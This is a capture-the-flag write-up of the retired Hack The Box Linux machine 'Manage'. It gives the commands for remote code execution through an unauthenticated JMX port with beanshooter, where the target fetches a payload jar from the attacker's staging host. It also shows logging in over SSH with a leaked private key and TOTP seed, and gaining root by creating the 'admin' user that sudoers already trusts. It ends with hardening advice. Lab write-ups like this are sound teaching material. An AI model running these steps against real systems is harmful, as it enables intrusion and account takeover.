# Manage — Hack The Box, Easy, Linux

*Flags redacted. Machine confirmed retired before publication.*

A three-link chain, and every link is a misconfiguration: an unauthenticated JMX
port, a backup that shouldn't have been world-readable, and a sudo rule that
looks safe until you notice what the sudoers file already trusts.

## Recon

Three ports that matter:

```
22/tcp    OpenSSH 8.9p1 Ubuntu (Jammy)
2222/tcp  Java RMI registry -> exports "jmxrmi"
8080/tcp  Apache Tomcat 10.1.19
```

A full sweep adds `38473` and `39393` — the RMI *object* ports the registry
hands out. The tell is on 2222: `rmi-dumpregistry` shows a bound name `jmxrmi`
pointing at `RMIServerImpl_Stub`. That is a **JMX** management endpoint, and the
first question about any JMX endpoint is always: does it require authentication?

Tomcat's Manager app on 8080 answers 403 from off-host (a `RemoteAddrValve`), and
SSH offers only publickey — so the two "obvious" doors are shut. The odd port is
the path.

## Foothold: unauthenticated JMX → RCE

`beanshooter` answers the auth question immediately — it enumerates the MBean
server with no credentials. That alone is the finding: authentication is off. Two
things fall out of it.

First, `beanshooter enum` reads the Tomcat **UserDatabase** MBean and prints the
application users in cleartext (a `manager` and an `admin`). Nice to have, but the
Manager app is IP-locked, so they don't directly land a shell.

Second — and this is the real primitive — an MBean server with the MLet loader
reachable is remote code execution. `beanshooter tonka` deploys a small
command-execution MBean by pointing the server at a staging URL it hosts:

```
beanshooter tonka deploy 10.129.x.x 2222 \
    --stager-url http://<tun0>:<port> --stager-host <tun0> --stager-port <port>
beanshooter tonka exec 10.129.x.x 2222 --shell /bin/sh "id"
# uid=1001(tomcat) gid=1001(tomcat) ... host: manage
```

The one gotcha: the deploy needs the target to fetch the MBean jar from *you*, so
the stager has to bind your VPN address, and `exec` runs an argv array — pass
`--shell /bin/sh` if you want pipes and `;`.

`user.txt` is sitting in `/opt/tomcat/user.txt`, readable by the service account.

## Lateral: a backup that gives away both SSH factors

Enumerating as `tomcat`, `/home` has `karl` and `useradmin`. `useradmin`'s home
is mostly locked down, but it has a `backups/` directory with a world-readable
`backup.tar.gz`. Unpacked, it is a copy of useradmin's home — including:

- `.ssh/id_ed25519` (whose public half matches the live `authorized_keys`), and
- `.google_authenticator` — the TOTP shared secret and emergency scratch codes.

SSH here is `publickey` **and** `keyboard-interactive` (2FA), so the key alone is
not enough. But the backup leaked the second factor too. Generate a live code
from the seed and log in:

```
oathtool --totp -b <SECRET>          # 6-digit code, valid for the window
ssh -i id_ed25519 useradmin@target   # answer "Verification code:" with it
```

(The recurring papercut: some `expect` builds silently fail to match a `(?i)`
inline-flag regex — match the literal `code:` prompt instead.)

## Privesc: create the user the policy already trusts

`sudo -l` as useradmin:

```
(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

The instinct is "option injection" — but the anchored `^[a-zA-Z0-9]+$` blocks
everything interesting: no `-` (no `--shell`, no `--ingroup`), no `/`, and the
two-argument `adduser <user> <group>` form (which would let you add yourself to
`sudo`) fails because the space breaks the regex. Testing confirms it: a
generic created user gets only its own group and **no** sudo rights, and
`adduser sudo` is refused because that group already exists. The regex is doing
its job.

So the escalation isn't in *how* you create the user — it's in *which* user. The
rule lets you create an arbitrary alphanumeric username as root, and the trick is
that `/etc/sudoers` (unreadable to you) grants full rights to a principal that
doesn't exist yet:

```
admin ALL=(ALL) ALL
```

The name lines up with the theme — the account is literally called `useradmin`,
the one whose job is to *add the admin*. Create it, set its password, and it
inherits the grant:

```
sudo /usr/sbin/adduser admin      # set a password at the prompt
su - admin                        # that password
sudo -i                           # (ALL) ALL  ->  uid=0
```

`root.txt` in `/root`.

## Why it works / how to break it

The chain is entirely configuration:

1. **JMX with `authenticate=false` on a network port** — enable auth+TLS or bind
   it to localhost. Everything downstream starts here.
2. **A backup readable by service accounts, containing a private key and a TOTP
   seed** — 2FA is only as strong as the file permissions on its secret.
3. **A sudoers rule that trusts a principal that doesn't exist.** The `adduser`
   grant was hardened against the obvious abuse and still lost, because "create
   any user" plus "this specific user is root" equals "create root." A grant to a
   non-existent user or group is a latent backdoor.

## Failed / discarded leads (worth logging)

- Tomcat Manager app — had the creds from JMX, but 403 off-host; not the path.
- `adduser` option/path/group-collision abuse — all correctly blocked by the
  regex; the constraint is real, and chasing it was the time sink.
- Generic user creation, orphan-UID adoption, skel/home symlink tricks, PATH
  injection into adduser's `which()` — all dead (env_reset, root-owned skel/home,
  no orphan-owned files). The win required knowing the trusted name, which came
  from reasoning about the box's theme, not from any readable file.
